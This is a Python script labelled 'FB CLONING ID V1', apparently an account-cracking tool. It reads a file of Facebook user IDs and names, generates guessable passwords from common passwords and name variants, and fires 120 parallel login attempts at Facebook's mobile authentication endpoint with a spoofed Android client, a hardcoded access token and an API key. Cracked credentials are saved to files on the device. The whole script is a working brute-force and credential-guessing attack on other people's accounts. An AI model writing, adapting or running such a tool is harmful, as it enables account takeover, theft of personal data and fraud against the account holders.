
import os, random, sys, json, uuid, time
from concurrent.futures import ThreadPoolExecutor as ThreadPool

gxdsanmtn1 = "|/-\\"
gxdsanmtn2 = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]
gxdsanmtn3 = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

try:
    import requests
except ModuleNotFoundError:
  for gxdsloading in range(10):
    time.sleep(0.3)
    sys.stdout.write("\r   LOADING: " + gxdsanmtn2[gxdsloading %
    len(gxdsanmtn2)])
    sys.stdout.flush()
    os.system("pip install requests -y")
    os.system('pip install requests bs4 futures==2 > /dev/null')
    import requests

li = "\033[38;5;46m"
blue = "\033[94m"
white = "\033[0;97m"
cyan = "\033[1;36m"
yellow = "\033[1;33m"
light_red = "\033[1;31m"
light_gray = "\033[1;37m"
light_purple = "\033[1;35m"
light_green = "\033[1;32m"

os.system('clear')

gxdsprnt=str(f"{white}"*37)
for gxdsloading in range(20):
    time.sleep(0.3)
    sys.stdout.write("\r   LOADING: " + gxdsanmtn3[gxdsloading %
    len(gxdsanmtn3)])
    sys.stdout.flush()
lxgo=f"""{light_gray}

                              d8b             
                              88P             
                             d88              
      d888b8b  ?88,  88P d888888   .d888b,    
     d8P' ?88   `?8bd8P'd8P' ?88   ?8b,       
     88b  ,88b  d8P?{light_purple}8b, 88b  ,88b    `?8b     
    `?88P'`88b d8P' `?8b`?88P'`88b`?888P'     
           )88  {cyan}FB CLONING ID V1
{light_purple}           ,88P                               
       `?8888P                  {white}              \n"""
 
def gxdslogo():
    os.system('clear')
    print(lxgo)
    os.system('xdg-open https://www.facebook.com/goxdies')

def main():
    gxdslogo()
    print("\033[0;97m  [1] START HITTING FB\n  [2] EXIT TOOL")
    print(gxdsprnt)
    gxdsoption=input("  [•] ENTER YOUR OPTION: ")
    os.system('clear')
    print(lxgo)
    if gxdsoption in ["1"]:
        gxdsfiles()
    elif gxdsoption in ["2"]:
        print(gxdsprnt)
        print("  [•] K, BYE.")
        os.system('xdg-open https://www.facebook.com/goxdies')
        print(gxdsprnt)
        sys.exit()
    else:
        print(gxdsprnt)
        print("  [X] INVALID CODE!")
        print(gxdsprnt)
        time.sleep(3)
        main()

def gxdsfiles():
    print(gxdsprnt)
    fl=input("  [-] INPUT YOUR OWN FB IDS FILE TO START CRACKING.\n  \033[1;33m[•] FILE PATH: ")
    os.system('clear')
    print(lxgo)
    print(gxdsprnt)
    try:
        id_file=open(fl,"r").read().splitlines()
    except:
        print("\033[1;91m  [X] FILE NOT FOUND.")
        print(gxdsprnt)
        sys.exit()
    gxdsforward(id_file)
    
def gxdsforward(id_file):
    tl=str(len(id_file))
    print("  \033[38;5;46m========================================")
    print("\033[1;31m  [-] TIP: ON/OFF THE DATA EVERY 5 MINUTES\n           TO SPEED UP THE PROCESS. \n")
    print("  \033[38;5;46m========================================")
    print("\033[1;97m  [•] TOTAL ID IN FILE:\033[1;33m "+tl)
    print("\033[1;97m  [•] PASSWORD LIST:\033[1;33m AUTOMATIC ")
    print("\033[1;97m  [•] FILE SAVE IN:\033[1;33m /sdcard/gxds.txt\n")
    print("  \033[38;5;46m========================================")
        
    print(gxdsprnt)
    with ThreadPool (max_workers=120) as feel:
        for data in id_file:
            uid=data.split("|")[0]
            gxdpwd=[]
            gxdpwd.append('12345678')
            gxdpwd.append('P@ssw0rd')
            gxdpwd.append('123456')
            gxdpwd.append('iloveyou')
            gxdpwd.append('iloveyou123')
            gxdpwd.append('1234567890')
            gxdpwd.append('password')
            gxdpwd.append('password123')
            gxdpwd.append('Password')
            gxdpwd.append('Password123')
            gxdpwd.append('qwerty123')
            gxdpwd.append('123456789')
            nam=data.split("|")[1]
            name=nam.lower()
            try:
                f_name=name.split(" ")[0]
                nam1=nam.split(" ")[0]
                if len(f_name) <3:
                    pass
                else:
                    gxdpwd.append(nam1+'123')
                    gxdpwd.append(f_name+'12')
                    gxdpwd.append(f_name+'123')
                    gxdpwd.append(f_name+'123')
                    gxdpwd.append(f_name+'1234')
                    gxdpwd.append(f_name+'12345')
                    gxdpwd.append(f_name+'@123')
                    gxdpwd.append(f_name+'pogi')
                    gxdpwd.append(f_name+'ganda')
                    gxdpwd.append(f_name+'143')
                    gxdpwd.append(f_name+'@143')
            except:pass
            try:
                mid_name=name.split(" ")[1]
                nam2=nam.split(" ")[1]
                if len(mid_name) <3:
                    pass
                else:
                    gxdpwd.append(nam1+" "+nam2)
                    gxdpwd.append(mid_name+'12')
                    gxdpwd.append(mid_name+'123')
                    gxdpwd.append(mid_name+' 123')
                    gxdpwd.append(mid_name+'1234')
                    gxdpwd.append(mid_name+'12345')
                    gxdpwd.append(mid_name+'@#')
                    gxdpwd.append(mid_name+'@@')
                    gxdpwd.append(mid_name+'@')
                    gxdpwd.append(mid_name+'@123')
                    #-Mix
                    gxdpwd.append(f_name+mid_name)
                    gxdpwd.append(f_name+mid_name+'143')
                    gxdpwd.append(f_name+mid_name+'12')
                    gxdpwd.append(f_name+mid_name+'123')
                    gxdpwd.append(f_name+mid_name+'1234')
                    gxdpwd.append(f_name+mid_name+'12345')
                    gxdpwd.append(f_name+mid_name+'@#')
                    gxdpwd.append(f_name+mid_name+'@@')
                    gxdpwd.append(f_name+mid_name+'@')
                    gxdpwd.append(f_name+mid_name+'@123')
                    gxdpwd.append(f_name+' '+mid_name)
                    gxdpwd.append(f_name+' '+mid_name+'123')
                    gxdpwd.append(f_name+' '+mid_name+'143')
                    gxdpwd.append(f_name+' '+mid_name+'1234')
                    gxdpwd.append(f_name+' '+sur_name)
            except:pass
            try:
                sur_name=name.split(" ")[2]
                nam3=nam.split(" ")[2]
                if len(sur_name) <3:
                    pass
                else:
                    gxdpwd.append(sur_name+'123')
                    gxdpwd.append(sur_name+'1234')
                    gxdpwd.append(sur_name+'12345')
                    gxdpwd.append(sur_name+'143')
                    gxdpwd.append(f_name+mid_name+sur_name)
                    gxdpwd.append(f_name+mid_name+sur_name+'123')
                    gxdpwd.append(f_name+mid_name+sur_name+'1234')
                    gxdpwd.append(f_name+mid_name+sur_name+'12345')
                    gxdpwd.append(f_name+mid_name+sur_name+'@#')
                    gxdpwd.append(f_name+mid_name+sur_name+'@@')
                    gxdpwd.append(f_name+mid_name+sur_name+'@')
                    gxdpwd.append(f_name+' '+mid_name+' '+sur_name)
                    gxdpwd.append(f_name+' '+mid_name+' '+sur_name+'123')
            except:pass
            feel.submit(file_subb,uid,gxdpwd)

loop=0
oks=[]
cps=[]
def file_subb(uid,gxdpwd):
    global oks,loop,cps
    sys.stdout.write(f"\r \033[1;97m [CHECKED]: {loop} [HITS]: {str(len(oks))} [CHECKPOINT]: {str(len(cps))}");sys.stdout.flush()
    session=requests.Session()
    try:
        for ps in gxdpwd:
            user_agent="Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_US",
            "client_country_code": "PH",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {
            'User-Agent': user_agent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            p = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).text
            q=json.loads(p)
            if "session_key" in q:
                print(f"\r\r\033[0;36m  [OK] {uid} : {ps}")
                open("/sdcard/gxds-ok.txt","a+").write("[OK]" +uid+" : "+ps+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in q:
                print(f"\r\r\033[94m  [CE] {uid} : {ps}\n")
                open("/sdcard/gxds-ce.txt","a+").write("[CE]" +uid+" : "+ps+"\n")
                oks.append(uid)
            elif "www.facebook.com" in q:
                print(f"\r\r\033[1;91m  [CP] {uid} : {ps}")
                cps.append(uid)
            else:
                continue
        loop+=1
    except:
        time.sleep(3)

main()